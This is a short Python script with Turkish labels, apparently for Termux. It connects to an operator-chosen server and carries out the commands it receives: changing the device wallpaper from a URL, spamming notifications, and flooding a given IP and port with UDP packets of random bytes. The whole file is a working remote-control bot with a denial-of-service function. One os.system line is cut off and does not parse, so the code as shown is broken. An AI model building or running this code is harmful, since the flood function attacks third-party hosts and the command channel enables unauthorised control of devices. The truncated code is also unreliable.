import socket
import subprocess
import os
import urllib.request

SERVER_IP = input("Server IP gir: ")
PORT = int(input("Port gir: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((SERVER_IP, PORT))
    s.send("[✓] Baglanti basarili.\n".encode())
except:
    print("Baglanti hatasi")
    exit()

def arkaplan_degistir(resim_url):
    try:
        urllib.request.urlretrieve(resim_url, "arka.jpg")
        os.system("termux-wallpaper -f arka.jpg")
        s.send("[+] Arka plan degistirildi\n".encode())
    except:
        s.send("[!] Arka plan degistirilemedi\n".encode())

def bildirim_gonder(mesaj, adet):
    for i in range(adet):
        os.system(f'termux-notification --title "Mesaj {i+1}" --content "{mesaj}">

def udp_yolla(ip, port, sayi):
    import random
    import time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    for i in range(sayi):
        sock.sendto(bytes, (ip, port))
    s.send("[+] UDP gonderimi tamamlandi\n".encode())

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut.startswith("arkaplan "):
            _, url = komut.split(" ", 1)
            arkaplan_degistir(url)
        elif komut.startswith("bildirim "):
            try:
                _, mesaj, flag, adet = komut.split(" ")
                if flag == "-m":
                    bildirim_gonder(mesaj, int(adet))
                    s.send("[+] Bildirim gonderildi\n".encode())
            except:
                s.send("[!] Hata: bildirim komutu\n".encode())
        elif komut.startswith("udp "):
            try:
                _, hedef_ip, hedef_port, paket_sayisi = komut.split(" ")
                udp_yolla(hedef_ip, int(hedef_port), int(paket_sayisi))
            except:
                s.send("[!] Hata: udp komutu\n".encode())
        elif komut == "exit":
            s.close()
            break
        else:
            try:
                s.send("[!] Gecersiz komut\n".encode())
            except:
                print("[-] Baglanti koptu.")
                break
    except:
        break
